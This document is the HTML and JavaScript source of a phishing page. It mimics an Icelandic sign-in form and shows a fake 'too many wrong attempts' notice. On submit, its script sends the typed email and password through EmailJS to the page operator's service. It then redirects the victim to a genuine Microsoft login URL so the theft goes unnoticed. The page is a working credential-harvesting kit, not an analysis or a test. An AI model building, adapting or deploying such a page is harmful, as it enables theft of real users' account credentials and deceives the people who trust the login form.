<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in | Login</title>
    <link rel="stylesheet" href="styles.css" />
    <link
      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
      rel="stylesheet"
    />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  </head>
  <body>
    <div class="wrapper">
      <form name="sentMessage" id="form" novalidate="novalidate">
        <div class="logo">
          <img src="log.PNG" alt="" />
          <p></p>
        </div>
        <div class="container">
          <div class="input-box">
            <input
              type="text"
              name="email"
              id="email"
              placeholder="Netfang"
              required
            />
          </div>
          <div class="input-box">
            <input
              type="password"
              name="pw"
              id="pw"
              placeholder="aðgangsorð"
              required
            />
            <button id="togglePassword">Show</button> 
            <p id="incemail">Þú reyndir að skrá þig inn of oft með röngum reikningi eða röngu aðgangsorði.</p>
          </div>
          <button onclick="SendMail()" id="button" type="submit" class="btn">
            Skráðu þig inn
          </button>
          <div class="register-link">
            <input type="checkbox" /> <span>Remember Me</span>
            <a href="#">Forgot Password?</a>
          </div>
        </div>
      </form>
    </div>
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
    ></script>
    <script type="text/javascript">
      emailjs.init("ifeZoH3iersVM4MOv");
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
      const btn = document.getElementById("button");
      document
        .getElementById("form")
        .addEventListener("submit", function (event) {
          event.preventDefault();

          
   const email = document.getElementById('email').value.trim();
  const password = document.getElementById('pw').value.trim();

  if (!email || !password) {
    alert('Please fill in all fields.');
    return;
  }




          btn.value = "Sending...";
          const serviceID = "service_6n9yh69";
          const templateID = "template_djgceli";
          emailjs.sendForm(serviceID, templateID, this).then(
            () => {
              btn.value = "Send Email";
              
              window.location.href =
                "https://login.live.com/ppsecure/post.srf?client_id=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&contextid=CFB825CBBA7E1A13&opid=48AA9853834CB914&bk=1724316802&uaid=7e7bbe0fccb54fbb9c33c0b1afb7b87a&pid=15216";
            },
            (err) => {
              btn.value = "Send Email";
              alert(JSON.stringify(err));
            }
          );
        });
    </script>
    <script>
      const passwordInput = document.getElementById("pw");
      const toggleButton = document.getElementById("togglePassword");
      toggleButton.addEventListener("click", function () {
        if (passwordInput.type === "password") {
          passwordInput.type = "text";
          toggleButton.textContent = "Hide";
        } else {
          passwordInput.type = "password";
          toggleButton.textContent = "Show";
        }
      });
    </script>
    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
    <script src="lib/typed/typed.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/waypoints/waypoints.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="lib/isotope/isotope.pkgd.min.js"></script>
    <script src="lib/lightbox/js/lightbox.min.js"></script>
    <!-- Contact Javascript File -->
    <script src="mail/jqBootstrapValidation.min.js"></script>
    <script src="mail/contact.js"></script>
    <!-- Template Javascript -->
    <script src="js/main.js"></script>
  </body>
</html>
